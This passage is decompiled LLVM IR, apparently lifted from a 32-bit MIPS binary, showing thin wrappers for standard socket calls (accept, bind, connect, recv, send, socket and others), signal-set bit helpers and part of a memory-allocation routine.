  %s0.global-to-local = alloca i32, align 4
  %v5_405c10 = inttoptr i32 %arg3 to i32*
  %v6_405c10 = call i32 @accept(i32 %arg1, %sockaddr* %arg2, i32* %v5_405c10)
  %v3_405c14 = load i32, i32* @global_var_449b6c.83, align 4
  store i32 %v3_405c14, i32* @t9, align 4
  %v1_405c18 = icmp eq i32 %arg4, 0
  store i32 %v6_405c10, i32* %s0.global-to-local, align 4
  br i1 %v1_405c18, label %dec_label_pc_405c34, label %dec_label_pc_405c1c

dec_label_pc_405c1c:                              ; preds = %dec_label_pc_405bf0
  %v1_405c20 = call i32 @function_4057a0()
  %v0_405c2c = load i32, i32* %s0.global-to-local, align 4
  %v2_405c2c = inttoptr i32 %v1_405c20 to i32*
  store i32 %v0_405c2c, i32* %v2_405c2c, align 4
  br label %dec_label_pc_405c34

dec_label_pc_405c34:                              ; preds = %dec_label_pc_405bf0, %dec_label_pc_405c1c
  %v4_405c3c = phi i32 [ %v6_405c10, %dec_label_pc_405bf0 ], [ -1, %dec_label_pc_405c1c ]
  ret i32 %v4_405c3c

; uselistorder directives
  uselistorder label %dec_label_pc_405c34, { 1, 0 }
}

define i32 @function_405c50(i32 %arg1, %sockaddr* %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_405c50:
  %s0.global-to-local = alloca i32, align 4
  %v5_405c70 = call i32 @bind(i32 %arg1, %sockaddr* %arg2, i32 %arg3)
  %v3_405c74 = load i32, i32* @global_var_449b6c.83, align 4
  store i32 %v3_405c74, i32* @t9, align 4
  %v0_405c78 = load i32, i32* @a3, align 4
  %v1_405c78 = icmp eq i32 %v0_405c78, 0
  store i32 %v5_405c70, i32* %s0.global-to-local, align 4
  br i1 %v1_405c78, label %dec_label_pc_405c94, label %dec_label_pc_405c7c

dec_label_pc_405c7c:                              ; preds = %dec_label_pc_405c50
  %v1_405c80 = call i32 @function_4057a0()
  %v0_405c8c = load i32, i32* %s0.global-to-local, align 4
  %v2_405c8c = inttoptr i32 %v1_405c80 to i32*
  store i32 %v0_405c8c, i32* %v2_405c8c, align 4
  br label %dec_label_pc_405c94

dec_label_pc_405c94:                              ; preds = %dec_label_pc_405c50, %dec_label_pc_405c7c
  %v4_405c9c = phi i32 [ %v5_405c70, %dec_label_pc_405c50 ], [ -1, %dec_label_pc_405c7c ]
  ret i32 %v4_405c9c

; uselistorder directives
  uselistorder label %dec_label_pc_405c94, { 1, 0 }
}

define i32 @function_405cb0(i32 %arg1, %sockaddr* %arg2) local_unnamed_addr {
dec_label_pc_405cb0:
  %s0.global-to-local = alloca i32, align 4
  %tmp = ptrtoint %sockaddr* %arg2 to i32
  store i32 %tmp, i32* @a1, align 4
  %v4_405cd0 = load i32, i32* @a2, align 4
  %v5_405cd0 = call i32 @connect(i32 %arg1, %sockaddr* %arg2, i32 %v4_405cd0)
  %v3_405cd4 = load i32, i32* @global_var_449b6c.83, align 4
  store i32 %v3_405cd4, i32* @t9, align 4
  %v0_405cd8 = load i32, i32* @a3, align 4
  %v1_405cd8 = icmp eq i32 %v0_405cd8, 0
  store i32 %v5_405cd0, i32* %s0.global-to-local, align 4
  br i1 %v1_405cd8, label %dec_label_pc_405cf4, label %dec_label_pc_405cdc

dec_label_pc_405cdc:                              ; preds = %dec_label_pc_405cb0
  %v1_405ce0 = call i32 @function_4057a0()
  %v0_405cec = load i32, i32* %s0.global-to-local, align 4
  %v2_405cec = inttoptr i32 %v1_405ce0 to i32*
  store i32 %v0_405cec, i32* %v2_405cec, align 4
  br label %dec_label_pc_405cf4

dec_label_pc_405cf4:                              ; preds = %dec_label_pc_405cb0, %dec_label_pc_405cdc
  %v4_405cfc = phi i32 [ %v5_405cd0, %dec_label_pc_405cb0 ], [ -1, %dec_label_pc_405cdc ]
  ret i32 %v4_405cfc

; uselistorder directives
  uselistorder label %dec_label_pc_405cf4, { 1, 0 }
}

define i32 @function_405d10(i32 %arg1, %sockaddr* %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_405d10:
  %s0.global-to-local = alloca i32, align 4
  %v5_405d30 = inttoptr i32 %arg3 to i32*
  %v6_405d30 = call i32 @getsockname(i32 %arg1, %sockaddr* %arg2, i32* %v5_405d30)
  %v3_405d34 = load i32, i32* @global_var_449b6c.83, align 4
  store i32 %v3_405d34, i32* @t9, align 4
  %v0_405d38 = load i32, i32* @a3, align 4
  %v1_405d38 = icmp eq i32 %v0_405d38, 0
  store i32 %v6_405d30, i32* %s0.global-to-local, align 4
  br i1 %v1_405d38, label %dec_label_pc_405d54, label %dec_label_pc_405d3c

dec_label_pc_405d3c:                              ; preds = %dec_label_pc_405d10
  %v1_405d40 = call i32 @function_4057a0()
  %v0_405d4c = load i32, i32* %s0.global-to-local, align 4
  %v2_405d4c = inttoptr i32 %v1_405d40 to i32*
  store i32 %v0_405d4c, i32* %v2_405d4c, align 4
  br label %dec_label_pc_405d54

dec_label_pc_405d54:                              ; preds = %dec_label_pc_405d10, %dec_label_pc_405d3c
  %v4_405d5c = phi i32 [ %v6_405d30, %dec_label_pc_405d10 ], [ -1, %dec_label_pc_405d3c ]
  ret i32 %v4_405d5c

; uselistorder directives
  uselistorder label %dec_label_pc_405d54, { 1, 0 }
}

define i32 @function_405d70(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_405d70:
  %s0.global-to-local = alloca i32, align 4
  %v3_405da8 = load i32, i32* @a3, align 4
  %v4_405da8 = inttoptr i32 %v3_405da8 to i32*
  %v5_405da8 = call i32 @getsockopt(i32 %arg1, i32 %arg2, i32 %arg3, i32* %v4_405da8, i32* null)
  %v3_405db0 = load i32, i32* @global_var_449b6c.83, align 4
  store i32 %v3_405db0, i32* @t9, align 4
  %v0_405db4 = load i32, i32* @a3, align 4
  %v1_405db4 = icmp eq i32 %v0_405db4, 0
  store i32 %v5_405da8, i32* %s0.global-to-local, align 4
  br i1 %v1_405db4, label %dec_label_pc_405dd0, label %dec_label_pc_405db8

dec_label_pc_405db8:                              ; preds = %dec_label_pc_405d70
  %v1_405dbc = call i32 @function_4057a0()
  %v0_405dc8 = load i32, i32* %s0.global-to-local, align 4
  %v2_405dc8 = inttoptr i32 %v1_405dbc to i32*
  store i32 %v0_405dc8, i32* %v2_405dc8, align 4
  br label %dec_label_pc_405dd0

dec_label_pc_405dd0:                              ; preds = %dec_label_pc_405d70, %dec_label_pc_405db8
  %v4_405de0 = phi i32 [ %v5_405da8, %dec_label_pc_405d70 ], [ -1, %dec_label_pc_405db8 ]
  ret i32 %v4_405de0

; uselistorder directives
  uselistorder label %dec_label_pc_405dd0, { 1, 0 }
}

define i32 @function_405df0(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_405df0:
  %s0.global-to-local = alloca i32, align 4
  %v2_405e10 = call i32 @listen(i32 %arg1, i32 %arg2)
  %v3_405e14 = load i32, i32* @global_var_449b6c.83, align 4
  store i32 %v3_405e14, i32* @t9, align 4
  %v0_405e18 = load i32, i32* @a3, align 4
  %v1_405e18 = icmp eq i32 %v0_405e18, 0
  store i32 %v2_405e10, i32* %s0.global-to-local, align 4
  br i1 %v1_405e18, label %dec_label_pc_405e34, label %dec_label_pc_405e1c

dec_label_pc_405e1c:                              ; preds = %dec_label_pc_405df0
  %v1_405e20 = call i32 @function_4057a0()
  %v0_405e2c = load i32, i32* %s0.global-to-local, align 4
  %v2_405e2c = inttoptr i32 %v1_405e20 to i32*
  store i32 %v0_405e2c, i32* %v2_405e2c, align 4
  br label %dec_label_pc_405e34

dec_label_pc_405e34:                              ; preds = %dec_label_pc_405df0, %dec_label_pc_405e1c
  %v4_405e3c = phi i32 [ %v2_405e10, %dec_label_pc_405df0 ], [ -1, %dec_label_pc_405e1c ]
  ret i32 %v4_405e3c

; uselistorder directives
  uselistorder label %dec_label_pc_405e34, { 1, 0 }
}

define i32 @function_405e50(i32 %arg1, i32* %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
dec_label_pc_405e50:
  %s0.global-to-local = alloca i32, align 4
  store i32 %arg4, i32* @a3, align 4
  %v5_405e70 = call i32 @recv(i32 %arg1, i32* %arg2, i32 %arg3, i32 %arg4)
  %v3_405e74 = load i32, i32* @global_var_449b6c.83, align 4
  store i32 %v3_405e74, i32* @t9, align 4
  %v1_405e78 = icmp eq i32 %arg4, 0
  store i32 %v5_405e70, i32* %s0.global-to-local, align 4
  br i1 %v1_405e78, label %dec_label_pc_405e94, label %dec_label_pc_405e7c

dec_label_pc_405e7c:                              ; preds = %dec_label_pc_405e50
  %v1_405e80 = call i32 @function_4057a0()
  %v0_405e8c = load i32, i32* %s0.global-to-local, align 4
  %v2_405e8c = inttoptr i32 %v1_405e80 to i32*
  store i32 %v0_405e8c, i32* %v2_405e8c, align 4
  br label %dec_label_pc_405e94

dec_label_pc_405e94:                              ; preds = %dec_label_pc_405e50, %dec_label_pc_405e7c
  %v4_405e9c = phi i32 [ %v5_405e70, %dec_label_pc_405e50 ], [ -1, %dec_label_pc_405e7c ]
  ret i32 %v4_405e9c

; uselistorder directives
  uselistorder i32 %arg4, { 1, 0, 2 }
  uselistorder label %dec_label_pc_405e94, { 1, 0 }
}

define i32 @function_405eb0(i32 %arg1, i32* %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6) local_unnamed_addr {
dec_label_pc_405eb0:
  %s0.global-to-local = alloca i32, align 4
  store i32 %arg4, i32* @a3, align 4
  %tmp = ptrtoint i32* %arg2 to i32
  store i32 %tmp, i32* @a1, align 4
  store i32 %arg5, i32* %s0.global-to-local, align 4
  %v5_405ef0 = call i32 @recvfrom(i32 %arg1, i32* %arg2, i32 %arg3, i32 %arg4, %sockaddr* null, i32* null)
  %v3_405ef8 = load i32, i32* @global_var_449b6c.83, align 4
  store i32 %v3_405ef8, i32* @t9, align 4
  %v1_405efc = icmp eq i32 %arg4, 0
  store i32 %v5_405ef0, i32* %s0.global-to-local, align 4
  br i1 %v1_405efc, label %dec_label_pc_405f18, label %dec_label_pc_405f00

dec_label_pc_405f00:                              ; preds = %dec_label_pc_405eb0
  %v1_405f04 = call i32 @function_4057a0()
  %v0_405f10 = load i32, i32* %s0.global-to-local, align 4
  %v2_405f10 = inttoptr i32 %v1_405f04 to i32*
  store i32 %v0_405f10, i32* %v2_405f10, align 4
  br label %dec_label_pc_405f18

dec_label_pc_405f18:                              ; preds = %dec_label_pc_405eb0, %dec_label_pc_405f00
  %v4_405f28 = phi i32 [ %v5_405ef0, %dec_label_pc_405eb0 ], [ -1, %dec_label_pc_405f00 ]
  ret i32 %v4_405f28

; uselistorder directives
  uselistorder label %dec_label_pc_405f18, { 1, 0 }
}

define i32 @function_405f30(i32 %arg1, i32* %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
dec_label_pc_405f30:
  %s0.global-to-local = alloca i32, align 4
  store i32 %arg4, i32* @a3, align 4
  %v5_405f50 = call i32 @send(i32 %arg1, i32* %arg2, i32 %arg3, i32 %arg4)
  %v3_405f54 = load i32, i32* @global_var_449b6c.83, align 4
  store i32 %v3_405f54, i32* @t9, align 4
  %v1_405f58 = icmp eq i32 %arg4, 0
  store i32 %v5_405f50, i32* %s0.global-to-local, align 4
  br i1 %v1_405f58, label %dec_label_pc_405f74, label %dec_label_pc_405f5c

dec_label_pc_405f5c:                              ; preds = %dec_label_pc_405f30
  %v1_405f60 = call i32 @function_4057a0()
  %v0_405f6c = load i32, i32* %s0.global-to-local, align 4
  %v2_405f6c = inttoptr i32 %v1_405f60 to i32*
  store i32 %v0_405f6c, i32* %v2_405f6c, align 4
  br label %dec_label_pc_405f74

dec_label_pc_405f74:                              ; preds = %dec_label_pc_405f30, %dec_label_pc_405f5c
  %v4_405f7c = phi i32 [ %v5_405f50, %dec_label_pc_405f30 ], [ -1, %dec_label_pc_405f5c ]
  ret i32 %v4_405f7c

; uselistorder directives
  uselistorder i32 %arg4, { 1, 0, 2 }
  uselistorder label %dec_label_pc_405f74, { 1, 0 }
}

define i32 @function_405f90(i32 %arg1, i32 %arg2, i32 %arg3, i32* %arg4, i32 %arg5) local_unnamed_addr {
dec_label_pc_405f90:
  %s0.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i32* %arg4 to i32
  store i32 %tmp, i32* @a3, align 4
  %v5_405fc8 = call i32 @setsockopt(i32 %arg1, i32 %arg2, i32 %arg3, i32* %arg4, i32 0)
  %v3_405fd0 = load i32, i32* @global_var_449b6c.83, align 4
  store i32 %v3_405fd0, i32* @t9, align 4
  %v1_405fd4 = icmp eq i32* %arg4, null
  store i32 %v5_405fc8, i32* %s0.global-to-local, align 4
  br i1 %v1_405fd4, label %dec_label_pc_405ff0, label %dec_label_pc_405fd8

dec_label_pc_405fd8:                              ; preds = %dec_label_pc_405f90
  %v1_405fdc = call i32 @function_4057a0()
  %v0_405fe8 = load i32, i32* %s0.global-to-local, align 4
  %v2_405fe8 = inttoptr i32 %v1_405fdc to i32*
  store i32 %v0_405fe8, i32* %v2_405fe8, align 4
  br label %dec_label_pc_405ff0

dec_label_pc_405ff0:                              ; preds = %dec_label_pc_405f90, %dec_label_pc_405fd8
  %v4_406000 = phi i32 [ %v5_405fc8, %dec_label_pc_405f90 ], [ -1, %dec_label_pc_405fd8 ]
  ret i32 %v4_406000

; uselistorder directives
  uselistorder label %dec_label_pc_405ff0, { 1, 0 }
}

define i32 @function_406010(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_406010:
  %s0.global-to-local = alloca i32, align 4
  store i32 %arg2, i32* @a1, align 4
  %v3_406030 = call i32 @socket(i32 %arg1, i32 %arg2, i32 %arg3)
  %v3_406034 = load i32, i32* @global_var_449b6c.83, align 4
  store i32 %v3_406034, i32* @t9, align 4
  %v0_406038 = load i32, i32* @a3, align 4
  %v1_406038 = icmp eq i32 %v0_406038, 0
  store i32 %v3_406030, i32* %s0.global-to-local, align 4
  br i1 %v1_406038, label %dec_label_pc_406054, label %dec_label_pc_40603c

dec_label_pc_40603c:                              ; preds = %dec_label_pc_406010
  %v1_406040 = call i32 @function_4057a0()
  %v0_40604c = load i32, i32* %s0.global-to-local, align 4
  %v2_40604c = inttoptr i32 %v1_406040 to i32*
  store i32 %v0_40604c, i32* %v2_40604c, align 4
  br label %dec_label_pc_406054

dec_label_pc_406054:                              ; preds = %dec_label_pc_406010, %dec_label_pc_40603c
  %v4_40605c = phi i32 [ %v3_406030, %dec_label_pc_406010 ], [ -1, %dec_label_pc_40603c ]
  ret i32 %v4_40605c

; uselistorder directives
  uselistorder label %dec_label_pc_406054, { 1, 0 }
}

define i32 @function_406070(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_406070:
  %a0.global-to-local = alloca i32, align 4
  %v0.global-to-local = alloca i32, align 4
  %v1.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %a0.global-to-local, align 4
  %stack_var_-152 = alloca i32, align 4
  %stack_var_-288 = alloca i32, align 4
  %stack_var_-296 = alloca i32, align 4
  %v0_406084 = load i32, i32* @s0, align 4
  store i32 -1, i32* %v0.global-to-local, align 4
  %v2_406090 = icmp eq i32 %arg2, -1
  store i32 %arg1, i32* @s0, align 4
  br i1 %v2_406090, label %dec_label_pc_4060a8, label %dec_label_pc_406094

dec_label_pc_406094:                              ; preds = %dec_label_pc_406070
  %v1_406098 = icmp slt i32 %arg1, 1
  %v3_406098 = icmp slt i32 %arg1, 128
  %v4_406098 = zext i1 %v3_406098 to i32
  store i32 %v4_406098, i32* %v0.global-to-local, align 4
  br i1 %v1_406098, label %dec_label_pc_4060a8, label %dec_label_pc_40609c

dec_label_pc_40609c:                              ; preds = %dec_label_pc_406094
  %v1_4060a0 = icmp eq i1 %v3_406098, false
  store i32 32, i32* %v1.global-to-local, align 4
  br i1 %v1_4060a0, label %dec_label_pc_4060a8, label %dec_label_pc_4060cc

dec_label_pc_4060a8:                              ; preds = %dec_label_pc_40609c, %dec_label_pc_406094, %dec_label_pc_406070
  %v3_4060a8 = load i32, i32* @global_var_449b6c.83, align 4
  store i32 %v3_4060a8, i32* @t9, align 4
  %v1_4060b0 = call i32 @function_4057a0()
  store i32 %v1_4060b0, i32* %v0.global-to-local, align 4
  store i32 22, i32* %v1.global-to-local, align 4
  store i32 -1, i32* %a0.global-to-local, align 4
  %v2_4060c8 = inttoptr i32 %v1_4060b0 to i32*
  store i32 22, i32* %v2_4060c8, align 4
  %v0_4060d8.pre.pre = load i32, i32* %v0.global-to-local, align 4
  br label %dec_label_pc_4060cc

dec_label_pc_4060cc:                              ; preds = %dec_label_pc_40609c, %dec_label_pc_4060a8
  %v0_4060d8.pre = phi i32 [ %v4_406098, %dec_label_pc_40609c ], [ %v0_4060d8.pre.pre, %dec_label_pc_4060a8 ]
  %v2_4060cc = ptrtoint i32* %stack_var_-296 to i32
  store i32 %v2_4060cc, i32* %a0.global-to-local, align 4
  br label %dec_label_pc_4060d8

dec_label_pc_4060d8:                              ; preds = %dec_label_pc_4060d8, %dec_label_pc_4060cc
  %v0_4060d8 = phi i32 [ %v4_4060e4, %dec_label_pc_4060d8 ], [ %v0_4060d8.pre, %dec_label_pc_4060cc ]
  %v1_4060d8 = add i32 %v0_4060d8, 8
  %v2_4060d8 = inttoptr i32 %v1_4060d8 to i32*
  store i32 0, i32* %v2_4060d8, align 4
  %v0_4060dc = load i32, i32* %v1.global-to-local, align 4
  %v1_4060dc = add i32 %v0_4060dc, -1
  store i32 %v1_4060dc, i32* %v1.global-to-local, align 4
  %v1_4060e0 = mul i32 %v1_4060dc, 4
  %v1_4060e4 = icmp sgt i32 %v1_4060dc, -1
  %v3_4060e4 = load i32, i32* %a0.global-to-local, align 4
  %v4_4060e4 = add i32 %v3_4060e4, %v1_4060e0
  store i32 %v4_4060e4, i32* %v0.global-to-local, align 4
  br i1 %v1_4060e4, label %dec_label_pc_4060d8, label %dec_label_pc_4060e8

dec_label_pc_4060e8:                              ; preds = %dec_label_pc_4060d8
  %v2_4060f0 = ptrtoint i32* %stack_var_-288 to i32
  store i32 %v2_4060f0, i32* %a0.global-to-local, align 4
  %v1_4060f4 = load i32, i32* @s0, align 4
  %v4_4060f4 = call i32 @function_406198(i32 %v2_4060f0, i32 %v1_4060f4)
  store i32 %v4_4060f4, i32* %v0.global-to-local, align 4
  %v1_406100 = icmp slt i32 %v4_4060f4, 0
  store i32 -1, i32* %a0.global-to-local, align 4
  br i1 %v1_406100, label %dec_label_pc_406158, label %dec_label_pc_406104

dec_label_pc_406104:                              ; preds = %dec_label_pc_4060e8
  %v3_40610c = load i32, i32* bitcast (i32** @global_var_449a90.216 to i32*), align 4
  store i32 %v3_40610c, i32* %a0.global-to-local, align 4
  %v1_406110 = load i32, i32* @s0, align 4
  %v4_406110 = call i32 @function_406170(i32 %v3_40610c, i32 %v1_406110)
  %v1_40611c = icmp eq i32 %v4_406110, 0
  %v1_406120 = select i1 %v1_40611c, i32 268435456, i32 0
  store i32 %v1_406120, i32* @v0, align 4
  %v3_406124 = load i32, i32* @global_var_449d28.217, align 4
  store i32 %v3_406124, i32* @t9, align 4
  store i32 %v1_406120, i32* %stack_var_-296, align 4
  %v0_40612c = load i32, i32* @s0, align 4
  store i32 %v0_40612c, i32* %a0.global-to-local, align 4
  %v3_406134 = ptrtoint i32* %stack_var_-152 to i32
  %v8_406134 = call i32 @function_4072f0(i32 %v0_40612c, i32* nonnull %stack_var_-296, i32 %v3_406134)
  store i32 %v8_406134, i32* %v0.global-to-local, align 4
  %v1_406140 = icmp slt i32 %v8_406134, 0
  br i1 %v1_406140, label %dec_label_pc_406154, label %dec_label_pc_406144

dec_label_pc_406144:                              ; preds = %dec_label_pc_406104
  br label %dec_label_pc_406154

dec_label_pc_406154:                              ; preds = %dec_label_pc_406104, %dec_label_pc_406144
  store i32 -1, i32* %a0.global-to-local, align 4
  br label %dec_label_pc_406158

dec_label_pc_406158:                              ; preds = %dec_label_pc_4060e8, %dec_label_pc_406154
  store i32 %v0_406084, i32* @s0, align 4
  store i32 -1, i32* %v0.global-to-local, align 4
  ret i32 -1

; uselistorder directives
  uselistorder i32 %v1_406120, { 1, 0 }
  uselistorder i32 %v4_4060e4, { 1, 0 }
  uselistorder i32 %v1_4060dc, { 1, 0, 2 }
  uselistorder i32* %v1.global-to-local, { 0, 2, 1, 3 }
  uselistorder i32* %v0.global-to-local, { 0, 1, 3, 2, 6, 7, 4, 5 }
  uselistorder i32* %a0.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 0 }
  uselistorder i32 %arg1, { 1, 0, 2, 3 }
  uselistorder label %dec_label_pc_406158, { 1, 0 }
  uselistorder label %dec_label_pc_406154, { 1, 0 }
  uselistorder label %dec_label_pc_4060cc, { 1, 0 }
}

define i32 @function_406170(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_406170:
  %v1_406170 = add i32 %arg2, -1
  %v1_406174 = udiv i32 %v1_406170, 32
  %v1_406178 = mul nuw nsw i32 %v1_406174, 4
  %v2_40617c = add i32 %v1_406178, %arg1
  %v1_406180 = inttoptr i32 %v2_40617c to i32*
  %v2_406180 = load i32, i32* %v1_406180, align 4
  store i32 %v2_406180, i32* @v1, align 4
  %v2_406188 = shl i32 1, %v1_406170
  %v2_40618c = and i32 %v2_406180, %v2_406188
  %v2_406190 = icmp ne i32 %v2_40618c, 0
  %v3_406190 = zext i1 %v2_406190 to i32
  ret i32 %v3_406190

; uselistorder directives
  uselistorder i32 %v1_406170, { 1, 0 }
}

define i32 @function_406198(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_406198:
  %v1_406198 = add i32 %arg2, -1
  %v1_40619c = udiv i32 %v1_406198, 32
  %v1_4061a0 = mul nuw nsw i32 %v1_40619c, 4
  %v2_4061a4 = add i32 %v1_4061a0, %arg1
  %v1_4061a8 = inttoptr i32 %v2_4061a4 to i32*
  %v2_4061a8 = load i32, i32* %v1_4061a8, align 4
  %v2_4061b0 = shl i32 1, %v1_406198
  %v2_4061b4 = or i32 %v2_4061a8, %v2_4061b0
  store i32 %v2_4061b4, i32* %v1_4061a8, align 4
  ret i32 0

; uselistorder directives
  uselistorder i32 %v1_406198, { 1, 0 }
}

define i32 @function_4061c4(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_4061c4:
  %v1_4061c4 = add i32 %arg2, -1
  %v1_4061c8 = udiv i32 %v1_4061c4, 32
  %v1_4061cc = mul nuw nsw i32 %v1_4061c8, 4
  %v2_4061d0 = add i32 %v1_4061cc, %arg1
  %v1_4061d8 = inttoptr i32 %v2_4061d0 to i32*
  %v2_4061d8 = load i32, i32* %v1_4061d8, align 4
  %tmp = shl i32 -1, %v1_4061c4
  %v1_4061e0 = add i32 %tmp, -1
  %v2_4061e4 = and i32 %v2_4061d8, %v1_4061e0
  store i32 %v2_4061e4, i32* %v1_4061d8, align 4
  ret i32 0
}

define i32 @function_406200(i32 %arg1) local_unnamed_addr {
dec_label_pc_406200:
  %a0.global-to-local = alloca i32, align 4
  %gp.global-to-local = alloca i32, align 4
  %s0.global-to-local = alloca i32, align 4
  %v0.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %a0.global-to-local, align 4
  %stack_var_-24 = alloca i32, align 4
  %v1_406208 = load i32, i32* @t9, align 4
  %v2_406208 = add i32 %v1_406208, 309344
  store i32 %v2_406208, i32* %gp.global-to-local, align 4
  %v0_406214 = load i32, i32* @s1, align 4
  %v0_406218 = load i32, i32* @s0, align 4
  %v0_406220 = load i32, i32* %a0.global-to-local, align 4
  %v1_406220 = icmp eq i32 %v0_406220, 0
  %v3_406220 = icmp ult i32 %v0_406220, -7
  %v4_406220 = zext i1 %v3_406220 to i32
  store i32 %v4_406220, i32* %v0.global-to-local, align 4
  br i1 %v1_406220, label %dec_label_pc_406224, label %dec_label_pc_406230

dec_label_pc_406224:                              ; preds = %dec_label_pc_406200
  store i32 1, i32* %a0.global-to-local, align 4
  br label %dec_label_pc_406230

dec_label_pc_406230:                              ; preds = %dec_label_pc_406200, %dec_label_pc_406224
  %v0_40623c = phi i32 [ %v0_406220, %dec_label_pc_406200 ], [ 1, %dec_label_pc_406224 ]
  %v1_406230 = icmp eq i1 %v3_406220, false
  br i1 %v1_406230, label %dec_label_pc_4063b8, label %dec_label_pc_406234

dec_label_pc_406234:                              ; preds = %dec_label_pc_406230
  %v1_40623c = add i32 %v0_40623c, 4
  store i32 %v1_40623c, i32* %v0.global-to-local, align 4
  %v3_406240 = load i32, i32* bitcast (i32** @global_var_449ca8.219 to i32*), align 4
  store i32 %v3_406240, i32* %a0.global-to-local, align 4
  store i32 %v1_40623c, i32* %stack_var_-24, align 4
  %v6_406244 = call i32 @function_406e64(i32 %v3_406240)
  store i32 %v6_406244, i32* %v0.global-to-local, align 4
  store i32 %v2_406208, i32* %gp.global-to-local, align 4
  %v3_406258 = load i32, i32* bitcast (i32*** @global_var_449c90.223 to i32*), align 4
  store i32 %v3_406258, i32* %a0.global-to-local, align 4
  %v3_40625c = ptrtoint i32* %stack_var_-24 to i32
  %tmp11 = inttoptr i32 %v3_406258 to i32*
  %v8_40625c = call i32 @function_406640(i32* %tmp11, i32 %v3_40625c)
  store i32 %v8_40625c, i32* %v0.global-to-local, align 4
  store i32 %v2_406208, i32* %gp.global-to-local, align 4
  %v3_406270 = load i32, i32* bitcast (i32** @global_var_449ca8.219 to i32*), align 4
  store i32 %v3_406270, i32* %a0.global-to-local, align 4
  store i32 %v8_40625c, i32* %s0.global-to-local, align 4
  %v3_406274 = call i32 @function_406e64(i32 %v3_406270)
  store i32 %v3_406274, i32* %v0.global-to-local, align 4
  store i32 %v2_406208, i32* %gp.global-to-local, align 4
  %v1_406280 = icmp eq i32 %v8_40625c, 0
  br i1 %v1_406280, label %dec_label_pc_406284, label %dec_label_pc_4063a0

dec_label_pc_406284:                              ; preds = %dec_label_pc_406234
  %v1_406288 = add i32 %v1_406208, 276864
  %v2_406288 = inttoptr i32 %v1_406288 to i32*
  %v3_406288 = load i32, i32* %v2_406288, align 4
  store i32 %v3_406288, i32* %v0.global-to-local, align 4
  %v3_40628c = load i32, i32* %stack_var_-24, align 4
  %v1_406290 = inttoptr i32 %v3_406288 to i32*
  %v2_406290 = load i32, i32* %v1_406290, align 4
  store i32 %v2_406290, i32* @s0, align 4
  %v2_406298 = icmp ult i32 %v3_40628c, %v2_406290
  %v4_40629c = add i32 %v2_406290, %v3_40628c
  store i32 %v4_40629c, i32* %v0.global-to-local, align 4
  br i1 %v2_406298, label %dec_label_pc_4062b0, label %dec_label_pc_4062a0

dec_label_pc_4062a0:                              ; preds = %dec_label_pc_406284
  %v1_4062a4 = add i32 %v4_40629c, -1
  store i32 %v1_4062a4, i32* %v0.global-to-local, align 4
  %v1_4062a8 = sub i32 0, %v2_406290
  %v2_4062ac = and i32 %v1_4062a4, %v1_4062a8
  store i32 %v2_4062ac, i32* @s0, align 4
  br label %dec_label_pc_4062b0

dec_label_pc_4062b0:                              ; preds = %dec_label_pc_406284, %dec_label_pc_4062a0
  %v3_4062b4 = load i32, i32* bitcast (i32** @global_var_449ba4.227 to i32*), align 4
  store i32 %v3_4062b4, i32* %a0.global-to-local, align 4
  %v2_4062b8 = call i32 @function_406e64(i32 %v3_4062b4)
  store i32 %v2_4062b8, i32* %v0.global-to-local, align 4
  store i32 %v2_406208, i32* %gp.global-to-local, align 4
  %v3_4062c8 = load i32, i32* @global_var_449ce8.228, align 4
  store i32 %v3_4062c8, i32* @t9, align 4
  %v1_4062d0 = load i32, i32* @s0, align 4
  store i32 %v1_4062d0, i32* %a0.global-to-local, align 4
  %v3_4062d0 = call i32 @function_407ad0(i32 %v1_4062d0)
  store i32 -1, i32* %v0.global-to-local, align 4
  store i32 %v2_406208, i32* %gp.global-to-local, align 4
  %v2_4062e4 = icmp eq i32 %v3_4062d0, -1
  %v4_4062e4 = add i32 %v3_4062d0, 3
  br i1 %v2_4062e4, label %dec_label_pc_4062e8, label %dec_label_pc_4062f4

dec_label_pc_4062e8:                              ; preds = %dec_label_pc_4062b0
  br label %dec_label_pc_4062f4

dec_label_pc_4062f4:                              ; preds = %dec_label_pc_4062b0, %dec_label_pc_4062e8
  store i32 -4, i32* %v0.global-to-local, align 4
  %v2_4062f8 = and i32 %v4_4062e4, -4
  store i32 %v2_4062f8, i32* @s1, align 4
  %v2_4062fc = icmp eq i32 %v2_4062f8, %v3_4062d0
  br i1 %v2_4062fc, label %dec_label_pc_40631c, label %dec_label_pc_406300

dec_label_pc_406300:                              ; preds = %dec_label_pc_4062f4
  %v3_406304 = load i32, i32* @global_var_449ce8.228, align 4
  store i32 %v3_406304, i32* @t9, align 4
  %v3_40630c = sub i32 %v2_4062f8, %v3_4062d0
  store i32 %v3_40630c, i32* %a0.global-to-local, align 4
  %v5_40630c = call i32 @function_407ad0(i32 %v3_40630c)
  store i32 %v5_40630c, i32* %v0.global-to-local, align 4
  store i32 %v2_406208, i32* %gp.global-to-local, align 4
  br label %dec_label_pc_40631c

dec_label_pc_40631c:                              ; preds = %dec_label_pc_4062f4, %dec_label_pc_406300
  %v3_406320 = load i32, i32* bitcast (i32** @global_var_449ba4.227 to i32*), align 4
  store i32 %v3_406320, i32* %a0.global-to-local, align 4
  %v2_406324 = call i32 @function_406e64(i32 %v3_406320)
  store i32 -1, i32* %v0.global-to-local, align 4
  store i32 %v2_406208, i32* %gp.global-to-local, align 4
  %v0_406334 = load i32, i32* @s1, align 4
  %v2_406334 = icmp eq i32 %v0_406334, -1
  br i1 %v2_406334, label %dec_label_pc_4063b8, label %dec_label_pc_406338

dec_label_pc_406338:                              ; preds = %dec_label_pc_40631c
  %v3_406340 = load i32, i32* bitcast (i32** @global_var_449ca8.219 to i32*), align 4
